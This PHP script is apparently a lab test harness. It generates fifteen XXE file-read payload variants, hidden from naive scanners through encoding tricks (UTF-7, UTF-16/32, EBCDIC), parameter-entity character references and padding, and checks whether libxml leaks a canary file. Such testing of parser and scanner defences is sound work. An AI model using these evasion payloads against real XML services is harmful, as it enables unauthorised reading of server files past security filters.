<?php
// XXE evasion shapes for the lab (lab/integration/legacy_sinks_container.sh): the
// same file-read payload, hidden from a naive scan of the raw bytes in ways
// libxml still understands.
//
//   php evade.php <variant> <libxml flags>   -> "<PARSED|REFUSED> <LEAK|NOLEAK>"
//   php evade.php list                       -> the variant names, one per line
//
// "LEAK" means the canary file's content ended up in the parsed document.
// PHP 5.4 .. 8.5 compatible.
$file = getenv('XXE_FILE');
$ent = '<!ENTITY x SYSTEM "file://' . $file . '">';
$root = '<r>&x;</r>';
$variants = array('doctype_gt', 'doctype_bracket', 'pe_literal', 'pe_charref', 'pe_charref_hex', 'pe_split_keyword',
    'utf7', 'utf32be', 'utf32le_bom', 'utf16le_nobom', 'utf16be_bom', 'ebcdic', 'padding_comment', 'padding_space', 'newlines');
if ($argv[1] === 'list') { echo implode("\n", $variants), "\n"; exit(0); }

function wide($s, $fmt) { $o = ''; foreach (str_split($s) as $c) { $o .= pack($fmt, ord($c)); } return $o; }

switch ($argv[1]) {
    case 'doctype_gt':      // '>' inside the DOCTYPE's own system literal
        $doc = '<?xml version="1.0"?><!DOCTYPE r SYSTEM "a>b" [' . $ent . ']>' . $root; break;
    case 'doctype_bracket': // '[' inside the system literal
        $doc = '<?xml version="1.0"?><!DOCTYPE r SYSTEM "a[b" [' . $ent . ']>' . $root; break;
    case 'pe_literal':      // a parameter entity whose literal declares the entity, then %pe;
        $doc = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % pe \'' . $ent . '\'> %pe;]>' . $root; break;
    case 'pe_charref':
        $lit = str_replace(array('<', '>'), array('&#60;', '&#62;'), $ent);
        $doc = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % pe \'' . $lit . '\'> %pe;]>' . $root; break;
    case 'pe_charref_hex':
        $lit = str_replace(array('<', '>'), array('&#x3C;', '&#x3e;'), $ent);
        $doc = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % pe \'' . $lit . '\'> %pe;]>' . $root; break;
    case 'pe_split_keyword':
        $lit = str_replace('SYSTEM', 'SYS&#84;EM', $ent);
        $doc = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % pe \'' . $lit . '\'> %pe;]>' . $root; break;
    case 'utf7':            // ASCII declaration, body in UTF-7
        $b = str_replace(array('<', '>', '[', ']'), array('+ADw-', '+AD4-', '+AFs-', '+AF0-'), '<!DOCTYPE r [' . $ent . ']>' . $root);
        $doc = '<?xml version="1.0" encoding="UTF-7"?>' . $b; break;
    case 'utf32be':
        $doc = wide('<?xml version="1.0"?><!DOCTYPE r [' . $ent . ']>' . $root, 'N'); break;
    case 'utf32le_bom':
        $doc = "\xFF\xFE\x00\x00" . wide('<?xml version="1.0"?><!DOCTYPE r [' . $ent . ']>' . $root, 'V'); break;
    case 'utf16le_nobom':
        $doc = wide('<?xml version="1.0"?><!DOCTYPE r [' . $ent . ']>' . $root, 'v'); break;
    case 'utf16be_bom':
        $doc = "\xFE\xFF" . wide('<?xml version="1.0"?><!DOCTYPE r [' . $ent . ']>' . $root, 'n'); break;
    case 'ebcdic':
        if (!function_exists('iconv')) { echo "NA\n"; exit(0); }
        $e = @iconv('UTF-8', 'IBM037', '<?xml version="1.0" encoding="IBM037"?><!DOCTYPE r [' . $ent . ']>' . $root);
        if ($e === false) { echo "NA\n"; exit(0); }
        $doc = $e; break;
    case 'padding_comment': // push the DOCTYPE out of any fixed-size window
        $doc = '<?xml version="1.0"?><!--' . str_repeat('x', 1200000) . '--><!DOCTYPE r [' . $ent . ']>' . $root; break;
    case 'padding_space':
        $doc = '<?xml version="1.0"?>' . str_repeat(' ', 1200000) . '<!DOCTYPE r [' . $ent . ']>' . $root; break;
    case 'newlines':        // ordinary whitespace inside the declaration
        $doc = "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY\n\tx\r\nSYSTEM\n\"file://" . $file . "\">]>" . $root; break;
    default:
        echo "unknown variant\n"; exit(2);
}
libxml_use_internal_errors(true);
$s = simplexml_load_string($doc, null, (int)$argv[2]);
$parsed = ($s !== false);
$text = $parsed ? (string)$s . $s->asXML() : '';
echo ($parsed ? 'PARSED' : 'REFUSED'), ' ', (strpos($text, 'CANARY_SECRET_9731') !== false ? 'LEAK' : 'NOLEAK'), "\n";
